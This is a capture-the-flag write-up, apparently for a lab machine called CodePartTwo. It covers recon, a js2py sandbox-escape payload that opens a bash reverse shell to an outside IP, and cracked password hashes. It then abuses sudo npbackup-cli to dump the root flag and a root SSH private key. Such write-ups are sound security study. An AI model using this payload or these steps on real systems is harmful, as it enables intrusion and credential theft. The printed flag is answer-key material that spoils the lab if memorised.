# CodePartTwo

<figure><img src="../../.gitbook/assets/image (88).png" alt=""><figcaption></figcaption></figure>



## Recon

### scan port

```bash
(base) ┌──(kali㉿kali)-[~]
└─$ rustscan -a 10.129.232.59 --ulimit 5000
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Port scanning: Because every port has a story to tell.

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.129.232.59:22
Open 10.129.232.59:8000
```

```bash
(base) ┌──(kali㉿kali)-[~]
└─$ sudo nmap -sC -sV -p22,8000 10.129.232.59
[sudo] password for kali: 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-28 23:55 -0400
Nmap scan report for 10.129.232.59
Host is up (0.30s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 a0:47:b4:0c:69:67:93:3a:f9:b4:5d:b3:2f:bc:9e:23 (RSA)
|   256 7d:44:3f:f1:b1:e2:bb:3d:91:d5:da:58:0f:51:e5:ad (ECDSA)
|_  256 f1:6b:1d:36:18:06:7a:05:3f:07:57:e1:ef:86:b4:85 (ED25519)
8000/tcp open  http    Gunicorn 20.0.4
|_http-title: Welcome to CodePartTwo
|_http-server-header: gunicorn/20.0.4
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```





```bash
--- Nmap SSH Scripts ---
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-29 00:07 -0400
Nmap scan report for 10.129.232.59
Host is up (0.27s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 a0:47:b4:0c:69:67:93:3a:f9:b4:5d:b3:2f:bc:9e:23 (RSA)
|   256 7d:44:3f:f1:b1:e2:bb:3d:91:d5:da:58:0f:51:e5:ad (ECDSA)
|_  256 f1:6b:1d:36:18:06:7a:05:3f:07:57:e1:ef:86:b4:85 (ED25519)
| ssh-auth-methods: 
|   Supported authentication methods: 
|     publickey
|_    password
| ssh2-enum-algos: 
|   kex_algorithms: (10)
|       curve25519-sha256
|       curve25519-sha256@libssh.org
|       ecdh-sha2-nistp256
|       ecdh-sha2-nistp384
|       ecdh-sha2-nistp521
|       diffie-hellman-group-exchange-sha256
|       diffie-hellman-group16-sha512
|       diffie-hellman-group18-sha512
|       diffie-hellman-group14-sha256
|       kex-strict-s-v00@openssh.com
|   server_host_key_algorithms: (5)
|       rsa-sha2-512
|       rsa-sha2-256
|       ssh-rsa
|       ecdsa-sha2-nistp256
|       ssh-ed25519
|   encryption_algorithms: (6)
|       chacha20-poly1305@openssh.com
|       aes128-ctr
|       aes192-ctr
|       aes256-ctr
|       aes128-gcm@openssh.com
|       aes256-gcm@openssh.com
|   mac_algorithms: (10)
|       umac-64-etm@openssh.com
|       umac-128-etm@openssh.com
|       hmac-sha2-256-etm@openssh.com
|       hmac-sha2-512-etm@openssh.com
|       hmac-sha1-etm@openssh.com
|       umac-64@openssh.com
|       umac-128@openssh.com
|       hmac-sha2-256
|       hmac-sha2-512
|       hmac-sha1
|   compression_algorithms: (2)
|       none
|_      zlib@openssh.com
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.70 seconds

--- ssh-keyscan ---
# 10.129.232.59:22 SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.13
# 10.129.232.59:22 SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.13
10.129.232.59 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCnwmWCXCzed9BzxaxS90h2iYyuDOrE2LkavbNeMlEUPvMpznuB9cs8CTnUenkaIA8RBb4mOfWGxAQ6a/nmKOea1FA6rfGG+fhOE/R1g8BkVoKGkpP1hR2XWbS3DWxJx3UUoKUDgFGSLsEDuW1C+ylg8UajGokSzK9NEg23WMpc6f+FORwJeHzOzsmjVktNrWeTOZthVkvQfqiDyB4bN0cTsv1mAp1jjbNnf/pALACTUmxgEemnTOsWk3Yt1fQkkT8IEQcOqqGQtSmOV9xbUmv6Y5ZoCAssWRYQ+JcR1vrzjoposAaMG8pjkUnXUN0KF/AtdXE37rGU0DLTO9+eAHXhvdujYukhwMp8GDi1fyZagAW+8YJb8uzeJBtkeMo0PFRIkKv4h/uy934gE0eJlnvnrnoYkKcXe+wUjnXBfJ/JhBlJvKtpLTgZwwlh95FJBiGLg5iiVaLB2v45vHTkpn5xo7AsUpW93Tkf+6ezP+1f3P7tiUlg3ostgHpHL5Z9478=
# 10.129.232.59:22 SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.13
10.129.232.59 ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBErhv1LbQSlbwl0ojaKls8F4eaTL4X4Uv6SYgH6Oe4Y+2qQddG0eQetFslxNF8dma6FK2YGcSZpICHKuY+ERh9c=
# 10.129.232.59:22 SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.13
10.129.232.59 ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEJovaecM3DB4YxWK2pI7sTAv9PrxTbpLG2k97nMp+FM
# 10.129.232.59:22 SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.13

```



### dump src code



```bash
  [★] http://10.129.232.59:8000/download ---> dump full src về
  [★] http://10.129.232.59:8000/register
  [★] http://10.129.232.59:8000/static/css/styles.css
  [★] http://10.129.232.59:8000/login
  [★] http://10.129.232.59:8000/static/js/script.js
  [★] http://10.129.232.59:8000/
```

<figure><img src="../../.gitbook/assets/image (792).png" alt=""><figcaption></figcaption></figure>

[https://github.com/GhostOverflow/CVE-2024-28397-command-execution-poc/blob/main/payload.js](https://github.com/GhostOverflow/CVE-2024-28397-command-execution-poc/blob/main/payload.js)

## Exploit

<figure><img src="../../.gitbook/assets/image (89).png" alt=""><figcaption></figcaption></figure>



```bash
Username           UID    GID    Home Directory              Shell
---------------------------------------------------------------------------
root               0      0      /root                       /bin/bash
daemon             1      1      /usr/sbin                   /usr/sbin/nologin
bin                2      2      /bin                        /usr/sbin/nologin
sys                3      3      /dev                        /usr/sbin/nologin
sync               4      65534  /bin                        /bin/sync
games              5      60     /usr/games                  /usr/sbin/nologin
man                6      12     /var/cache/man              /usr/sbin/nologin
lp                 7      7      /var/spool/lpd              /usr/sbin/nologin
mail               8      8      /var/mail                   /usr/sbin/nologin
news               9      9      /var/spool/news             /usr/sbin/nologin
uucp               10     10     /var/spool/uucp             /usr/sbin/nologin
proxy              13     13     /bin                        /usr/sbin/nologin
www-data           33     33     /var/www                    /usr/sbin/nologin
backup             34     34     /var/backups                /usr/sbin/nologin
list               38     38     /var/list                   /usr/sbin/nologin
irc                39     39     /var/run/ircd               /usr/sbin/nologin
gnats              41     41     /var/lib/gnats              /usr/sbin/nologin
nobody             65534  65534  /nonexistent               /usr/sbin/nologin
systemd-network    100    102    /run/systemd               /usr/sbin/nologin
systemd-resolve    101    103    /run/systemd               /usr/sbin/nologin
systemd-timesync   102    104    /run/systemd               /usr/sbin/nologin
messagebus         103    106    /nonexistent               /usr/sbin/nologin
syslog             104    110    /home/syslog               /usr/sbin/nologin
_apt               105    65534  /nonexistent               /usr/sbin/nologin
tss                106    111    /var/lib/tpm               /bin/false
uuidd              107    112    /run/uuidd                 /usr/sbin/nologin
tcpdump            108    113    /nonexistent               /usr/sbin/nologin
landscape          109    115    /var/lib/landscape         /usr/sbin/nologin
pollinate          110    1      /var/cache/pollinate       /bin/false
fwupd-refresh      111    116    /run/systemd               /usr/sbin/nologin
usbmux             112    46     /var/lib/usbmux            /usr/sbin/nologin
sshd               113    65534  /run/sshd                  /usr/sbin/nologin
systemd-coredump   999    999    /                           /usr/sbin/nologin
marco              1000   1000   /home/marco               /bin/bash
lxd                998    100    /var/snap/lxd/common/lxd   /bin/false
app                1001   1001   /home/app                 /bin/bash
mysql              114    118    /nonexistent               /bin/false
_laurel            997    997    /var/log/laurel           /bin/false
```





<figure><img src="../../.gitbook/assets/image (90).png" alt=""><figcaption></figcaption></figure>



```javascript
{"code":"let hacked, bymarve, n11, obj\nhacked = Object.getOwnPropertyNames({})\nbymarve = hacked.__getattribute__\nn11 = bymarve(\"__getattribute__\")\nobj = n11(\"__class__\").__base__\nfunction findClass(o, name) {\n  let result;\nfor (let i in o.__subclasses__()) {\n    let item = o.__subclasses__()[i]\n    if (item.__name__ == name) return item\n    if (item.__name__ != \"type\" && (result = findClass(item, name))) return result\n  }\n}\nlet cw =findClass(obj, \"catch_warnings\")\nlet b = cw()._module.__builtins__\nlet os = b.__import__(\"os\")\nos.popen(\"nohup bash -c 'bash -i >& /dev/tcp/10.10.14.190/4444 0>&1' >/dev/null 2>&1 &\")\n\"triggered\""}
```

<figure><img src="../../.gitbook/assets/image (91).png" alt=""><figcaption></figcaption></figure>



```bash
app@codeparttwo:~/app/instance$ strings users,db
strings users,db
strings: 'users,db': No such file
app@codeparttwo:~/app/instance$ strings users.db
strings users.db
SQLite format 3
Wtablecode_snippetcode_snippet
CREATE TABLE code_snippet (
        id INTEGER NOT NULL, 
        user_id INTEGER NOT NULL, 
        code TEXT NOT NULL, 
        PRIMARY KEY (id), 
        FOREIGN KEY(user_id) REFERENCES user (id)
Ctableuseruser
CREATE TABLE user (
        id INTEGER NOT NULL, 
        username VARCHAR(80) NOT NULL, 
        password_hash VARCHAR(128) NOT NULL, 
        PRIMARY KEY (id), 
        UNIQUE (username)
indexsqlite_autoindex_user_1user
Mappa97588c0e2fa3a024876339e27aeb42e)
Mmarco649c9d65a206a75f5abe509fe128bce5
        marco
app@codeparttwo:~/app/instance$ 
```

### lateral movement

<figure><img src="../../.gitbook/assets/image (784).png" alt=""><figcaption></figcaption></figure>

```
sweetangelbabylove
```

<figure><img src="../../.gitbook/assets/image (785).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (786).png" alt=""><figcaption></figcaption></figure>



### &#x20;Privilege Escalation



<figure><img src="../../.gitbook/assets/image (788).png" alt=""><figcaption></figcaption></figure>





<figure><img src="../../.gitbook/assets/image (787).png" alt=""><figcaption></figcaption></figure>



```bash
marco@codeparttwo:~$ sudo /usr/local/bin/npbackup-cli -c npbackup1.conf --ls
2026-04-29 09:53:50,340 :: INFO :: npbackup 3.0.1-linux-UnknownBuildType-x64-legacy-public-3.8-i 2025032101 - Copyright (C) 2022-2025 NetInvent running as root
2026-04-29 09:53:50,368 :: INFO :: Loaded config E1057128 in /home/marco/npbackup1.conf
2026-04-29 09:53:50,378 :: INFO :: Showing content of snapshot latest in repo default
2026-04-29 09:53:52,575 :: INFO :: Successfully listed snapshot latest content:
snapshot 0d8f9308 of [/root] at 2026-04-29 09:53:26.573220771 +0000 UTC by root@codeparttwo filtered by []:
/root
/root/.bash_history
/root/.bashrc
/root/.cache
/root/.cache/motd.legal-displayed
/root/.local
/root/.local/share
/root/.local/share/nano
/root/.local/share/nano/search_history
/root/.mysql_history
/root/.profile
/root/.python_history
/root/.sqlite_history
/root/.ssh
/root/.ssh/authorized_keys
/root/.ssh/id_rsa
/root/.vim
/root/.vim/.netrwhist
/root/root.txt
/root/scripts
/root/scripts/backup.tar.gz
/root/scripts/cleanup.sh
/root/scripts/cleanup_conf.sh
/root/scripts/cleanup_db.sh
/root/scripts/cleanup_marco.sh
/root/scripts/npbackup.conf
/root/scripts/users.db
```



```bash
marco@codeparttwo:~$ sudo /usr/local/bin/npbackup-cli -c npbackup1.conf --dump /root/root.txt
0c7fd1c403afd8b9236ae2e0c5fa2c4c
```





```bash
marco@codeparttwo:~$ vi id_rsa
marco@codeparttwo:~$ cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEA9apNjja2/vuDV4aaVheXnLbCe7dJBI/l4Lhc0nQA5F9wGFxkvIEy
VXRep4N+ujxYKVfcT3HZYR6PsqXkOrIb99zwr1GkEeAIPdz7ON0pwEYFxsHHnBr+rPAp9d
EaM7OOojou1KJTNn0ETKzvxoYelyiMkX9rVtaETXNtsSewYUj4cqKe1l/w4+MeilBdFP7q
kiXtMQ5nyiO2E4gQAvXQt9bkMOI1UXqq+IhUBoLJOwxoDwuJyqMKEDGBgMoC2E7dNmxwJV
XQSdbdtrqmtCZJmPhsAT678v4bLUjARk9bnl34/zSXTkUnH+bGKn1hJQ+IG95PZ/rusjcJ
hNzr/GTaAntxsAZEvWr7hZF/56LXncDxS0yLa5YVS8YsEHerd/SBt1m5KCAPGofMrnxSSS
pyuYSlw/OnTT8bzoAY1jDXlr5WugxJz8WZJ3ItpUeBi4YSP2Rmrc29SdKKqzryr7AEn4sb
JJ0y4l95ERARsMPFFbiEyw5MGG3ni61Xw62T3BTlAAAFiCA2JBMgNiQTAAAAB3NzaC1yc2
EAAAGBAPWqTY42tv77g1eGmlYXl5y2wnu3SQSP5eC4XNJ0AORfcBhcZLyBMlV0XqeDfro8
WClX3E9x2WEej7Kl5DqyG/fc8K9RpBHgCD3c+zjdKcBGBcbBx5wa/qzwKfXRGjOzjqI6Lt
SiUzZ9BEys78aGHpcojJF/a1bWhE1zbbEnsGFI+HKintZf8OPjHopQXRT+6pIl7TEOZ8oj
thOIEAL10LfW5DDiNVF6qviIVAaCyTsMaA8LicqjChAxgYDKAthO3TZscCVV0EnW3ba6pr
QmSZj4bAE+u/L+Gy1IwEZPW55d+P80l05FJx/mxip9YSUPiBveT2f67rI3CYTc6/xk2gJ7
cbAGRL1q+4WRf+ei153A8UtMi2uWFUvGLBB3q3f0gbdZuSggDxqHzK58UkkqcrmEpcPzp0
0/G86AGNYw15a+VroMSc/FmSdyLaVHgYuGEj9kZq3NvUnSiqs68q+wBJ+LGySdMuJfeREQ
EbDDxRW4hMsOTBht54utV8Otk9wU5QAAAAMBAAEAAAGBAJYX9ASEp2/IaWnLgnZBOc901g
RSallQNcoDuiqW14iwSsOHh8CoSwFs9Pvx2jac8dxoouEjFQZCbtdehb/a3D2nDqJ/Bfgp
4b8ySYdnkL+5yIO0F2noEFvG7EwU8qZN+UJivAQMHT04Sq0yJ9kqTnxaOPAYYpOOwwyzDn
zjW99Efw9DDjq6KWqCdEFbclOGn/ilFXMYcw9MnEz4n5e/akM4FvlK6/qZMOZiHLxRofLi
1J0Elq5oyJg2NwJh6jUQkOLitt0KjuuYPr3sRMY98QCHcZvzUMmJ/hPZIZAQFtJEtXHkt5
UkQ9SgC/LEaLU2tPDr3L+JlrY1Hgn6iJlD0ugOxn3fb924P2y0Xhar56g1NchpNe1kZw7g
prSiC8F2ustRvWmMPCCjS/3QSziYVpM2uEVdW04N702SJGkhJLEpVxHWszYbQpDatq5ckb
SaprgELr/XWWFjz3FR4BNI/ZbdFf8+bVGTVf2IvoTqe6Db0aUGrnOJccgJdlKR8e2nwQAA
AMEA79NxcGx+wnl11qfgc1dw25Olzc6+Jflkvyd4cI5WMKvwIHLOwNQwviWkNrCFmTihHJ
gtfeE73oFRdMV2SDKmup17VzbE47x50m0ykT09KOdAbwxBK7W3A99JDckPBlqXe0x6TG65
UotCk9hWibrl2nXTufZ1F3XGQu1LlQuj8SHyijdzutNQkEteKo374/AB1t2XZIENWzUZNx
vP8QwKQche2EN1GQQS6mGWTxN5YTGXjp9jFOc0EvAgwXczKxJ1AAAAwQD7/hrQJpgftkVP
/K8GeKcY4gUcfoNAPe4ybg5EHYIF8vlSSm7qy/MtZTh2Iowkt3LDUkVXcEdbKm/bpyZWre
0P6Fri6CWoBXmOKgejBdptb+Ue+Mznu8DgPDWFXXVkgZOCk/1pfAKBxEH4+sOYOr8o9SnI
nSXtKgYHFyGzCl20nAyfiYokTwX3AYDEo0wLrVPAeO59nQSroH1WzvFvhhabs0JkqsjGLf
kMV0RRqCVfcmReEI8S47F/JBg/eOTsWfUAAADBAPmScFCNisrgb1dvow0vdWKavtHyvoHz
bzXsCCCHB9Y+33yrL4fsaBfLHoexvdPX0Ssl/uFCilc1zEvk30EeC1yoG3H0Nsu+R57BBI
o85/zCvGKm/BYjoldz23CSOFrssSlEZUppA6JJkEovEaR3LW7b1pBIMu52f+64cUNgSWtH
kXQKJhgScWFD3dnPx6cJRLChJayc0FHz02KYGRP3KQIedpOJDAFF096MXhBT7W9ZO8Pen/
MBhgprGCU3dhhJMQAAAAxyb290QGNvZGV0d28BAgMEBQ==
-----END OPENSSH PRIVATE KEY-----

marco@codeparttwo:~$ chmod 600 id_rsa
```



```bash
marco@codeparttwo:~$ ssh -i id_rsa root@10.129.232.59
root@codeparttwo:~# id
uid=0(root) gid=0(root) groups=0(root)
root@codeparttwo:~# 
```



<figure><img src="../../.gitbook/assets/image (789).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (790).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (791).png" alt=""><figcaption></figcaption></figure>

